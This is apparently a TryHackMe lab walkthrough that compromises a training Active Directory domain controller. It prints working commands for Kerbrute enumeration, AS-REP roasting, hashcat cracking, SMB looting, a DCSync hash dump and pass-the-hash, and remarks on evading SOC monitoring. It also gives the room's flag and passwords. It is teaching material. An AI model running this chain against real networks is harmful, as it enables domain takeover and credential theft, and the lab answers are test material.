# Attacktive Directory — A Beginner's Guide to Hacking Active Directory

> **TryHackMe Room:** Attacktive Directory
> **Difficulty:** Medium
> **Flag:** `TryHackMe{4ctiveD1rectoryM4st3r}`
> **Author:** k3rn3l-32

---

## Table of Contents

1. [What is Active Directory?](#what-is-active-directory)
2. [The Target](#the-target)
3. [Phase 1 — Reconnaissance (Nmap)](#phase-1--reconnaissance-nmap)
4. [Phase 2 — Username Enumeration (Kerbrute)](#phase-2--username-enumeration-kerbrute)
5. [Phase 3 — AS-REP Roasting](#phase-3--as-rep-roasting)
6. [Phase 4 — Cracking the Hash (Hashcat)](#phase-4--cracking-the-hash-hashcat)
7. [Phase 5 — SMB Enumeration](#phase-5--smb-enumeration)
8. [Phase 6 — LDAP Enumeration](#phase-6--ldap-enumeration)
9. [Phase 7 — DCSync Attack](#phase-7--dcsync-attack)
10. [Phase 8 — Pass-the-Hash & Root](#phase-8--pass-the-hash--root)
11. [Full Attack Chain Summary](#full-attack-chain-summary)

---

## What is Active Directory?

Imagine a huge company with 5,000 employees. Every single one of them needs a username and password to log into their computer, access to specific shared folders, the ability to print, an email account, maybe VPN access if they work remotely. Without some central system handling all of this, the IT department would collapse under the weight of it. That is exactly the problem Active Directory was built to solve.

Active Directory is Microsoft's system for managing everything in a Windows network. It lives on a special server called a Domain Controller and acts as the single source of truth for the entire organization — who you are, what you can access, and what you are allowed to do.

### The Key Players in AD

```
                    +-------------------------+
                    |     Domain Controller   |
                    |   (The Brain / The Hub) |
                    |                         |
                    |  - Stores all passwords |
                    |  - Controls all access  |
                    |  - Runs Kerberos (auth) |
                    |  - Runs LDAP (directory)|
                    |  - Runs DNS             |
                    +------------+------------+
                                 |
              +------------------+-----------------+
              |                  |                 |
    +---------+------+  +--------+-------+  +------+---------+
    |  User Accounts |  | Computer Accts |  | Service Accts  |
    |  (james, robin)|  | (DESKTOP-01$)  |  | (svc-admin)    |
    +----------------+  +----------------+  +----------------+
```

### Why AD is a Hacker's Dream Target

If you compromise the Domain Controller, you own everything. Every user account, every computer, every file share — it all falls. This is why Active Directory pentesting is one of the most valuable skills in offensive security. Most enterprise networks run on it, and a single misconfiguration can bring the whole thing down.

### Key Services Running on a DC

| Port | Service  | What it Does                                      |
|------|----------|---------------------------------------------------|
| 53   | DNS      | Resolves domain names like `spookysec.local`      |
| 88   | Kerberos | Handles authentication (login tickets)            |
| 389  | LDAP     | Directory queries (find users, groups, computers) |
| 445  | SMB      | File sharing (shared drives, SYSVOL, NETLOGON)    |
| 3389 | RDP      | Remote Desktop (GUI access)                       |
| 5985 | WinRM    | Remote PowerShell management                      |

---

## The Target

- **IP:** `10.129.181.176`
- **Domain:** `spookysec.local`
- **Hostname:** `AttacktiveDirectory.spookysec.local`
- **OS:** Windows Server 2019

---

## Phase 1 — Reconnaissance (Nmap)

Every engagement starts the same way — you scan. Before you can attack anything, you need to know what is running and on which ports. Nmap is the standard tool for this.

```bash
nmap -sV -sC -A -p- 10.129.181.176
```

### Key Flags Explained

- `-sV` — Detect service versions
- `-sC` — Run default scripts
- `-A` — Aggressive scan (OS detection, traceroute)
- `-p-` — Scan all 65535 ports

### Results

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-15 23:41:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
          rdp-ntlm-info:
            Target_Name: THM-AD
            DNS_Domain_Name: spookysec.local
            DNS_Computer_Name: AttacktiveDirectory.spookysec.local
            Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### What We Learned

The combination of ports 88 (Kerberos), 389 (LDAP), and 53 (DNS) is the classic fingerprint of a Domain Controller. Beyond that, the LDAP banner handed us the domain name `spookysec.local` without us having to do anything special. Port 5985 (WinRM) being open is also worth noting — that will be our shell access once we have valid credentials.

> **Note:** The LDAP service banner told us the domain name for free. Always read nmap output carefully. People often skim it and miss things that would save them a lot of time.

---

## Phase 2 — Username Enumeration (Kerbrute)

### How Kerberos Authentication Works

Think of Kerberos like a nightclub with a VIP list. When you walk up to the door, you tell the bouncer your name. He checks the list. If your name is on it, he asks to see your ID. If your name is not on it, he tells you he has never heard of you and turns you away.

The vulnerability here is subtle but powerful. The bouncer's response is different depending on whether your name is on the list or not. If we pay attention to those different responses, we can figure out which names are valid — without ever needing to show an ID.

```
1. You tell the bouncer (KDC) your name
2. The bouncer checks if you are on the list
3. If you ARE on the list — bouncer asks for your ID (password)
4. If you are NOT on the list — bouncer says "never heard of you"
```

That difference in error messages is what kerbrute exploits.

### Installing Kerbrute

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/kerbrute
```

### Downloading the Wordlists

TryHackMe provides a custom wordlist for this room that contains accounts specific to this environment. Generic wordlists will miss them.

```bash
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```

### Running the Enumeration

```bash
kerbrute userenum --dc 10.129.181.176 -d spookysec.local userlist.txt -o kerbrute_results.txt
```

### Results

```
[+] VALID USERNAME:  james@spookysec.local
[+] VALID USERNAME:  robin@spookysec.local
[+] VALID USERNAME:  darkstar@spookysec.local
[+] VALID USERNAME:  administrator@spookysec.local
[+] VALID USERNAME:  backup@spookysec.local
[+] VALID USERNAME:  paradox@spookysec.local
[+] VALID USERNAME:  svc-admin@spookysec.local
```

### Extract Usernames for Later

```bash
grep "VALID" kerbrute_results.txt | awk '{print $NF}' | cut -d'@' -f1 > full_users.txt
```

> **Note:** This technique generates very little noise. Standard failed login attempts create Event ID 4625, which most SOC teams alert on. Kerberos pre-authentication failures (Event ID 4768) are far less commonly monitored, making this a stealthy way to build a valid user list.

---

## Phase 3 — AS-REP Roasting

### What is AS-REP Roasting?

To understand this attack, you need to understand how Kerberos pre-authentication works. Normally, when a user wants to log in, the client first proves it knows the password by encrypting a timestamp with the user's password hash. Only after that proof does the DC hand back an AS-REP ticket.

Normal Kerberos flow:
```
Client -> DC: "I want to authenticate as svc-admin"
DC -> Client: "Prove you know the password first (pre-auth)"
Client -> DC: [timestamp encrypted with password hash]
DC -> Client: "Here is your AS-REP ticket"
```

Now, if an account has the flag `UF_DONT_REQUIRE_PREAUTH` set, the DC skips that proof entirely. It will hand out the AS-REP ticket to anyone who asks — no password needed. That ticket is encrypted with the user's password hash, which means we can take it offline and crack it at our own pace.

AS-REP Roasting flow when pre-authentication is disabled:
```
Client -> DC: "I want to authenticate as svc-admin"
DC -> Client: "Sure, here is your AS-REP ticket" <- NO PASSWORD CHECK
              [encrypted with svc-admin's password hash]
Client: cracks the hash offline
```

### Running the Attack

```bash
impacket-GetNPUsers spookysec.local/ \
  -dc-ip 10.129.181.176 \
  -usersfile full_users.txt \
  -no-pass \
  -outputfile asrep_hashes.txt \
  -format hashcat
```

### Result

```
[-] User james does not have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9167e55357fc1ee324c5e697ef9d858c$...
[-] User darkstar does not have UF_DONT_REQUIRE_PREAUTH set
```

`svc-admin` is vulnerable. The hash format `$krb5asrep$23$` tells us everything we need:

- `krb5asrep` — this is an AS-REP roast hash
- `23` — etype 23, meaning RC4-HMAC encryption, which is weak and fast to crack

Full name on the Hashcat wiki: **Kerberos 5, etype 23, AS-REP**

---

## Phase 4 — Cracking the Hash (Hashcat)

### Why Can We Crack It Offline?

The AS-REP ticket is encrypted using the user's password hash. To crack it, hashcat takes each word from the wordlist, hashes it with MD4, and tries to decrypt the ticket with that hash. If the decryption succeeds, the password has been found. The entire process happens on our machine with no connection to the target — no lockouts, no logs, no alerts.

```bash
hashcat -m 18200 asrep_hashes.txt passwordlist.txt --force
```

### Reveal the Cracked Password

```bash
hashcat -m 18200 asrep_hashes.txt passwordlist.txt --show
```

### Result

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[hash]:management2005
```

**Credentials: `svc-admin` : `management2005`**

---

## Phase 5 — SMB Enumeration

SMB is Windows' file sharing protocol. Domain Controllers use it to host SYSVOL and NETLOGON shares that deliver group policies and login scripts to every machine in the domain. With valid credentials, we can see exactly what shares exist and what we have access to.

### List All Shares

```bash
smbmap -H 10.129.181.176 -u svc-admin -p management2005 -d spookysec.local
```

### Results

```
[+] IP: 10.129.181.176:445   Name: spookysec.local    Status: Authenticated
    Disk                          Permissions    Comment
    ----                          -----------    -------
    ADMIN$                        NO ACCESS      Remote Admin
    backup                        READ ONLY
    C$                            NO ACCESS      Default share
    IPC$                          READ ONLY      Remote IPC
    NETLOGON                      READ ONLY      Logon server share
    SYSVOL                        READ ONLY      Logon server share
```

The `backup` share stands out immediately. It is non-standard and readable — worth investigating.

### Accessing the Backup Share

```bash
smbclient //10.129.181.176/backup -U 'spookysec.local\svc-admin%management2005'
```

```
smb: \> ls
  .                                   D        0
  ..                                  D        0
  backup_credentials.txt              A       48

smb: \> get backup_credentials.txt
```

### Decoding the Credentials

```bash
cat backup_credentials.txt
# YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
# backup@spookysec.local:backup2517860
```

**New Credentials: `backup` : `backup2517860`**

Worth noting — Base64 is not encryption. It is just encoding, like writing in pig latin. Anyone can decode it in seconds. Storing credentials this way on a readable network share is one of the worst things an admin can do.

---

## Phase 6 — LDAP Enumeration

LDAP is how applications and users query Active Directory. Think of it like a search engine for the directory — you can look up users, groups, computers, and their attributes. Now that we have valid credentials, we can read the entire directory.

```bash
ldapsearch -x -H ldap://10.129.181.176 \
  -D "svc-admin@spookysec.local" \
  -w 'management2005' \
  -b "DC=spookysec,DC=local" \
  "(objectClass=user)" sAMAccountName
```

### Key Findings

```
sAMAccountName: Administrator

sAMAccountName: backup          <- OU=Administrator
sAMAccountName: a-spooks        <- OU=Administrator

sAMAccountName: svc-admin       <- OU=Staff
```

The `backup` account sits inside `OU=Administrator`. That is a serious red flag. Service and backup accounts should never be placed in admin OUs. This tells us the account almost certainly has elevated privileges beyond what its name suggests.

---

## Phase 7 — DCSync Attack

This is the most powerful attack in the Active Directory playbook.

### What is DCSync?

Large organizations run multiple Domain Controllers for redundancy. If you change a password on DC1, DC2 needs to find out about it. This synchronization happens automatically using a protocol called DRSUAPI — the Directory Replication Service Remote API. The AD permission that allows a machine to request this replication is called `Replicating Directory Changes`.

The problem we found: the `backup` account had been granted this permission. That is a privilege that should only ever belong to actual Domain Controllers. Someone misconfigured it and gave it to a regular user account.

By impersonating a Domain Controller using the `backup` account, we can ask the real DC to replicate all of its credential data to us — including every password hash stored in NTDS.DIT.

```bash
impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.129.181.176
```

### The Output

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\svc-admin:1114:...:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:...:19741bde08e135f4b40f1ca9aab45538:::
```

### Understanding the Hash Format

Every line follows this structure:

```
username : RID : LM_hash : NT_hash
```

| Field | Administrator's Value | Meaning |
|-------|-----------------------|---------|
| Username | `Administrator` | Account name |
| RID | `500` | Built-in admin is always 500 |
| LM Hash | `aad3b435...` | Same for everyone — LM is disabled |
| NT Hash | `0e0363213e37b94221497260b0bcb4fc` | The actual password hash |

The NT hash is computed as `MD4(UTF-16-LE(password))` — this is exactly what Windows uses internally during authentication. The LM hash being identical across all accounts just means LM authentication is disabled on this DC, which is standard on modern Windows.

### What We Now Have

| Account | Value | Significance |
|---------|-------|--------------|
| `Administrator` | `0e0363213e37b94221497260b0bcb4fc` | Full domain admin |
| `krbtgt` | `0e2eb8158c27bed09861033026be4c21` | Golden Ticket material |
| All 18 users | Dumped | Every account in the domain |

> **Note:** The `krbtgt` hash deserves special attention. With it, you can forge Golden Tickets — Kerberos tickets that grant access to any resource in the domain. Golden Tickets remain valid even if every password in the domain is reset. It is essentially a permanent backdoor.

---

## Phase 8 — Pass-the-Hash & Root

### What is Pass-the-Hash?

Here is something that surprises a lot of people when they first learn it. Windows does not actually verify your password when you authenticate over NTLM. It verifies your password hash. When you type your password, Windows hashes it and sends the hash. The server compares that hash against the stored hash.

So if you already have the hash, you skip the password entirely. You just send the hash directly. The server cannot tell the difference.

```bash
evil-winrm -i 10.129.181.176 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

### Shell Access

```
Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```

**Domain fully compromised.**

---

## Full Attack Chain Summary

```
+------------------------------------------------------------------+
|                        ATTACK CHAIN                              |
+------------------------------------------------------------------+
|                                                                  |
|  [1] Nmap Scan                                                   |
|      -> Identified DC, domain name: spookysec.local             |
|                                                                  |
|  [2] Kerbrute Username Enum (Port 88)                            |
|      -> Found: james, robin, darkstar, svc-admin, backup...     |
|                                                                  |
|  [3] AS-REP Roasting (GetNPUsers)                                |
|      -> svc-admin has UF_DONT_REQUIRE_PREAUTH                    |
|      -> Got: $krb5asrep$23$ hash                                 |
|                                                                  |
|  [4] Hashcat (-m 18200)                                          |
|      -> Cracked: svc-admin : management2005                     |
|                                                                  |
|  [5] SMB Enumeration (smbmap + smbclient)                        |
|      -> Found readable backup share                              |
|      -> Downloaded: backup_credentials.txt                      |
|                                                                  |
|  [6] Base64 Decode                                               |
|      -> Decoded: backup : backup2517860                         |
|                                                                  |
|  [7] LDAP Enumeration                                            |
|      -> Confirmed backup in OU=Administrator                     |
|      -> Identified all domain users                              |
|                                                                  |
|  [8] DCSync (secretsdump via DRSUAPI)                            |
|      -> Dumped entire NTDS.DIT                                   |
|      -> Got Administrator NTLM: 0e0363213e37b94221497260b0bcb4fc|
|                                                                  |
|  [9] Pass-the-Hash (evil-winrm -H)                               |
|      -> Shell as Administrator                                   |
|      -> root.txt: TryHackMe{4ctiveD1rectoryM4st3r}              |
|                                                                  |
+------------------------------------------------------------------+
```

---

*Written by k3rn3l-32 | TryHackMe Walkthrough | 2026*
